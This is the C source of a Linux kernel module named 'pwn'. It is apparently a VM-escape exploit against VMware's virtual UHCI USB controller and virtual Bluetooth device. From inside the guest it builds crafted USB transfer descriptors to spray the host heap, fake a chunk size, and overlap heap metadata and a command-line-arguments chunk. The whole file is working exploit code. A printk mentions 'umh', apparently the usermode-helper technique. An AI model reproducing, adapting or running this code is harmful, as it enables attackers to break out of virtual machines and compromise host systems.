#include <linux/module.h>    // included for all kernel modules
#include <linux/kernel.h>    // included for KERN_INFO
#include <linux/init.h>      // included for __init and __exit macros

#include <linux/errno.h>
#include <linux/slab.h>
#include <linux/mm.h>
#include <linux/moduleparam.h>
#include <linux/scatterlist.h>
#include <linux/mutex.h>
#include <linux/timer.h>
#include <linux/usb.h>
#include <linux/usb/ch9.h>
#include <linux/usb/hcd.h>
#include <linux/mount.h>
#include <linux/path.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/delay.h>
#include <linux/dmapool.h>
#include <linux/kallsyms.h>
#include <linux/vmw_vmci_defs.h>
#include "uhci-hcd.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("?");
MODULE_DESCRIPTION("pwn");
        
int vmci_send_datagram(struct vmci_datagram *dg);

#define uhci_myendpoint(x) (x << 15)

#define DEVICEADDR 0x00000400

#define POOL_SIZE 0x6200 

#ifndef vmci_guest_device
struct vmci_guest_device {
	struct device *dev;	/* PCI device we are attached to */
	void __iomem *iobase;
	bool exclusive_vectors;
	struct tasklet_struct datagram_tasklet;
	struct tasklet_struct bm_tasklet;
	void *data_buffer;
	void *notification_bitmap;
	dma_addr_t notification_base;
};
#endif
struct vmci_guest_device *my_vmci_dev_g;


struct uhci_qh *g_frames[1024];
static struct dma_pool * mypool;
static struct dma_pool * setuppool;
static struct dma_pool * tdpool;
static struct dma_pool * qhpool;

static void simple_callback(struct urb *urb)
{
    printk(KERN_INFO "simple_callback was invoked\n");
    complete(urb->context);
}

static struct uhci_td *uhci_alloc_td(struct uhci_hcd *uhci)
{
	dma_addr_t dma_handle;
	struct uhci_td *td;

	td = dma_pool_alloc(tdpool, GFP_KERNEL, &dma_handle);
	if (!td)
		return NULL;

	td->dma_handle = dma_handle;
	td->frame = -1;

	// set terminate bit, null out the rest of the field
	td->link = 1;

	return td;
}

static struct uhci_qh *uhci_alloc_qh(struct uhci_hcd *uhci)
{
    dma_addr_t dma_handle;
    struct uhci_qh *qh;

    qh = dma_pool_zalloc(qhpool, GFP_KERNEL, &dma_handle);

    qh->dma_handle = dma_handle;

    qh->element = UHCI_PTR_TERM(uhci);
    qh->link = UHCI_PTR_TERM(uhci);

    qh->dummy_td = uhci_alloc_td(uhci);

	qh->type = USB_ENDPOINT_XFER_BULK;
    return qh;
}

static inline void uhci_fill_td(struct uhci_hcd *uhci, struct uhci_td *td,
		u32 status, u32 token, u32 buffer)
{
	td->status = cpu_to_hc32(uhci, status);
	td->token = cpu_to_hc32(uhci, token);
	td->buffer = cpu_to_hc32(uhci, buffer);
}

__hc32 uhci_submit_control(struct uhci_hcd *uhci, dma_addr_t data,
		int len, dma_addr_t setupdata, struct uhci_qh *qh)
{
	struct uhci_td *td;
	unsigned long status;
	__hc32 *plink = NULL;
	__hc32 retval = 0;
	unsigned int toggle = 1;

	/* 3 errors, dummy TD remains inactive */
#define uhci_maxerr(err)		((err) << TD_CTRL_C_ERR_SHIFT)
	status = uhci_maxerr(3) | TD_CTRL_ACTIVE;

	td = qh->dummy_td;
	uhci_fill_td(uhci, td, status,
                uhci_endpoint(3) |
				DEVICEADDR | uhci_explen(8) |
					(toggle << TD_TOKEN_TOGGLE_SHIFT) | USB_PID_SETUP,
				setupdata);
	plink = &td->link;

	/*
	 * Build the DATA TDs
	 */
	while (len > 0) {	/* Allow zero length packets */
		int pktsze = 0x20;
        toggle ^= 1;
		if (len <= pktsze) {		/* The last packet */
			pktsze = len;
		}

        td = uhci_alloc_td(uhci);

        // this endpoint corresponds to the vmware Virtual Bluetooth device
		uhci_fill_td(uhci, td, status,
                uhci_endpoint(3) |
				DEVICEADDR | uhci_explen(pktsze) |
					(toggle << TD_TOKEN_TOGGLE_SHIFT) | USB_PID_OUT,
				data);
        *plink = LINK_TO_TD(uhci, td);
		plink = &td->link;
		status |= TD_CTRL_ACTIVE;

		data += pktsze;
		len -= pktsze;
	}

    toggle ^= 1;

	/*
	 * Build the new dummy TD and activate the old one
	 */
	td = uhci_alloc_td(uhci);
	*plink = LINK_TO_TD(uhci, td);

	uhci_fill_td(uhci, td, 0, USB_PID_IN | uhci_explen(0) | (toggle << TD_TOKEN_TOGGLE_SHIFT), 0);
	wmb();
	retval = qh->dummy_td->dma_handle;
	qh->dummy_td = uhci_alloc_td(uhci);

	return retval;

}

__hc32 uhci_setup_leak(struct uhci_hcd *uhci, struct uhci_qh *qh)
{
	struct uhci_td *td;
	unsigned long status;
	__hc32 *plink;
	__hc32 retval = 0;
	unsigned int toggle = 0;
    int x = 0, added_tds = 0;
		
    dma_addr_t data = 0;
    u8 * dma_vaddr = dma_pool_alloc(mypool, GFP_KERNEL, &data);
    memset(dma_vaddr, 0x42, POOL_SIZE);

	/* 3 errors, dummy TD remains inactive */
#define uhci_maxerr(err)		((err) << TD_CTRL_C_ERR_SHIFT)
	status = uhci_maxerr(3) | TD_CTRL_ACTIVE;

    // spray 0x18 TDs of size 0x100
	plink = NULL;
	td = qh->dummy_td;

	for(x = 0; x < 0x18; x++) {
		if (plink) {
			td = uhci_alloc_td(uhci);
			*plink = LINK_TO_TD(uhci, td);
		}

        // this endpoint corresponds to the vmware Virtual Bluetooth device
		uhci_fill_td(uhci, td, status,
                uhci_myendpoint(0x2) | USB_PID_OUT |
				DEVICEADDR | uhci_explen(0x100) |
					(toggle << TD_TOKEN_TOGGLE_SHIFT),
				data);
		plink = &td->link;
		status |= TD_CTRL_ACTIVE;

        data += 0x100;
        dma_vaddr += 0x100;
        added_tds++;
	}

    memset(dma_vaddr, 0x00, 0x400);
    memset(dma_vaddr, 0x43, 0x70);
    dma_vaddr[0x78] = 0xa0; dma_vaddr[0x79] = 0x18;

    // we are actually gonna fake this chunk size so it looks bigger than it really is
    dma_vaddr[0x80] = 0x21; dma_vaddr[0x81] = 0x14;
    //dma_vaddr[0x80] = 0xe1; dma_vaddr[0x81] = 0x3;

    // this TD is overlapping the heap metadata
    for(x = 0; x < 1; x++) {
		if (plink) {
			td = uhci_alloc_td(uhci);
			*plink = LINK_TO_TD(uhci, td);
		}

        // this endpoint corresponds to the vmware Virtual Bluetooth device
		uhci_fill_td(uhci, td, status,
                uhci_myendpoint(0x2) | USB_PID_OUT |
				DEVICEADDR | uhci_explen(0x88) |
					(toggle << TD_TOKEN_TOGGLE_SHIFT),
				data);
		plink = &td->link;
		status |= TD_CTRL_ACTIVE;

        added_tds++;
        data += 0x88;
        dma_vaddr += 0x88;
    }

    // this TD overlaps the full cmdlineargs chunk
    memset(dma_vaddr, 0x44, 0x3e0);
    // dma_vaddr[0x3d0] = 0x00; dma_vaddr[0x3d1] = 0x03;
    // dma_vaddr[0x3d8] = 0x11; dma_vaddr[0x3d9] = 0x08;
    for(x = 0; x < 1; x++) {
		if (plink) {
			td = uhci_alloc_td(uhci);
			*plink = LINK_TO_TD(uhci, td);
		}

        // this endpoint corresponds to the vmware Virtual Bluetooth device
		uhci_fill_td(uhci, td, status,
                uhci_myendpoint(0x2) | USB_PID_OUT |
				DEVICEADDR | uhci_explen(0x3e0) |
					(toggle << TD_TOKEN_TOGGLE_SHIFT),
				data);
		plink = &td->link;
		status |= TD_CTRL_ACTIVE;
        added_tds++;
        data += 0x3e0;
        dma_vaddr += 0x3e0;
    }

    memset(dma_vaddr, 0x44, 0x78);
    for(x = 0; x < 1; x++) {
		if (plink) {
			td = uhci_alloc_td(uhci);
			*plink = LINK_TO_TD(uhci, td);
		}

        // this endpoint corresponds to the vmware Virtual Bluetooth device
		uhci_fill_td(uhci, td, status,
                uhci_myendpoint(0x2) | USB_PID_OUT |
				DEVICEADDR | uhci_explen(0x78) |
					(toggle << TD_TOKEN_TOGGLE_SHIFT),
				data);
		plink = &td->link;
		status |= TD_CTRL_ACTIVE;
        added_tds++;
        data += 0x78;
        dma_vaddr += 0x78;
    }

    // remaining TDs all have data lengths of 0
    for(x = 0; x < (0x62 - added_tds); x++) {

		if (plink) {
			td = uhci_alloc_td(uhci);
			*plink = LINK_TO_TD(uhci, td);
		}

        // this endpoint corresponds to the vmware Virtual Bluetooth device
		uhci_fill_td(uhci, td, status,
                uhci_myendpoint(0x2) | USB_PID_OUT |
				DEVICEADDR | uhci_explen(0) |
					(toggle << TD_TOKEN_TOGGLE_SHIFT),
				data);
		plink = &td->link;
		status |= TD_CTRL_ACTIVE;
        data += 0x100;
        dma_vaddr += 0x100;
    }

	/*
	 * Build the new dummy TD and activate the old one
	 */

	td = uhci_alloc_td(uhci);
	*plink = LINK_TO_TD(uhci, td);

	uhci_fill_td(uhci, td, 0, USB_PID_OUT | uhci_explen(0), 0);
	wmb();
	qh->dummy_td->status |= cpu_to_hc32(uhci, TD_CTRL_ACTIVE);
	retval = qh->dummy_td->dma_handle;
	qh->dummy_td = td;

	return retval;

}

__hc32 uhci_submit_bulk(struct uhci_hcd *uhci, dma_addr_t data,
		int len, struct uhci_qh *qh)
{
	struct uhci_td *td;
	unsigned long status;
	__hc32 *plink;
	__hc32 retval = 0;
	unsigned int toggle = 0;

	/* 3 errors, dummy TD remains inactive */
#define uhci_maxerr(err)		((err) << TD_CTRL_C_ERR_SHIFT)
	status = uhci_maxerr(3) | TD_CTRL_ACTIVE;

	/*
	 * Build the DATA TDs
	 */
	plink = NULL;
	td = qh->dummy_td;
	while (len > 0) {	/* Allow zero length packets */
		int pktsze = 0x100;
		if (len <= pktsze) {		/* The last packet */
			pktsze = len;
		}

		if (plink) {
			td = uhci_alloc_td(uhci);
			*plink = LINK_TO_TD(uhci, td);
		}

        // this endpoint corresponds to the vmware Virtual Bluetooth device
		uhci_fill_td(uhci, td, status,
                uhci_myendpoint(0x2) | USB_PID_OUT |
				DEVICEADDR | uhci_explen(pktsze) |
					(toggle << TD_TOKEN_TOGGLE_SHIFT),
				data);
		plink = &td->link;
		status |= TD_CTRL_ACTIVE;

		data += pktsze;
		len -= pktsze;
	}

	/*
	 * Build the new dummy TD and activate the old one
	 */

	td = uhci_alloc_td(uhci);
	*plink = LINK_TO_TD(uhci, td);

	uhci_fill_td(uhci, td, 0, USB_PID_OUT | uhci_explen(0), 0);
	wmb();
	qh->dummy_td->status |= cpu_to_hc32(uhci, TD_CTRL_ACTIVE);
	retval = qh->dummy_td->dma_handle;
	qh->dummy_td = td;

	return retval;

}

static int __init pwn_init(void)
{
        int x = 0;

        char mydata[0x20] = {};
        memset(mydata, 0x41, sizeof(mydata));

        struct vmci_datagram mydg;
        memset(&mydg, 0x41, sizeof(mydg));

        my_vmci_dev_g = *(struct vmci_guest_device **)kallsyms_lookup_name("vmci_dev_g");
        printk("vmci_dev_g: %lx\n", (unsigned long)my_vmci_dev_g);

        printk("we out here doing umh and shit\n");
 
        // get inode
        char *path_name = "/sys/kernel/debug/usb/uhci/0000:02:00.0";
        struct inode *inode = NULL;
        struct path path = {};
        kern_path(path_name, LOOKUP_FOLLOW, &path);
        inode = path.dentry->d_inode;
        struct uhci_hcd *uhci = inode->i_private;

		tdpool = dma_pool_create("uhci_td2", uhci_dev(uhci),
				sizeof(struct uhci_td), 16, 0);

		qhpool = dma_pool_create("uhci_qh2", uhci_dev(uhci),
				sizeof(struct uhci_qh), 16, 0);
        
		// set up my dma pool
		mypool = dma_pool_create("uhci-data", uhci_dev(uhci),
			POOL_SIZE, 16, 0);
		setuppool = dma_pool_create("uhci-setupdata", uhci_dev(uhci),
			0x10, 16, 0);

        // disable uhci processing
        uhci_writew(uhci, 0, USBCMD);

        // set uhci frame number to 0
        uhci_writew(uhci, 0, USBFRNUM);
        msleep(5);

        printk("trying to send URB\n");
		struct urb * urb = usb_alloc_urb(0, GFP_KERNEL);
		urb->dev = uhci_to_hcd(uhci)->self.root_hub;
		urb->pipe = usb_sndbulkpipe(urb->dev, 0x41);
       	urb->transfer_buffer = kzalloc(0x2000, GFP_ATOMIC);
		urb->transfer_buffer_length = 0x2000;
		urb->complete = simple_callback;
		urb->context = uhci_to_hcd(uhci);
        urb->transfer_dma = 0;

        struct usb_host_endpoint ep = { .enabled=1 };
        ep.desc.bmAttributes = USB_ENDPOINT_XFER_BULK;
        ep.desc.wMaxPacketSize = 0xffff;
        INIT_LIST_HEAD(&ep.urb_list);
        urb->ep = &ep;

		dma_addr_t setupdata = 0;
		u8 * setup_dma_vaddr = dma_pool_alloc(setuppool, GFP_KERNEL, &setupdata);
		memset(setup_dma_vaddr, 0, 0x10);
		*(u16 *)&setup_dma_vaddr[6] = 0x100;

        for(x = 0; x < 1024; x++) {
            uhci->frame[x] = 1;
        }

        g_frames[0] = uhci_alloc_qh(uhci);

        __hc32 mytd = uhci_setup_leak(uhci, g_frames[0]);
        
        local_irq_disable();
        
        uhci->frame[0] = mytd;

        uhci_writew(uhci, USBCMD_SWDBG | USBCMD_RS | USBCMD_CF | USBCMD_MAXP, USBCMD);
        wmb();
		msleep(500);
        uhci_writew(uhci, 0, USBCMD);
        wmb();
		msleep(5);

        local_irq_enable();
        return 0;    // Non-zero return means that the module couldn't be loaded.
}

static void __exit pwn_cleanup(void)
{
	    printk(KERN_INFO "Cleaning up module.\n");
		dma_pool_destroy(mypool);
}

module_init(pwn_init);
module_exit(pwn_cleanup);
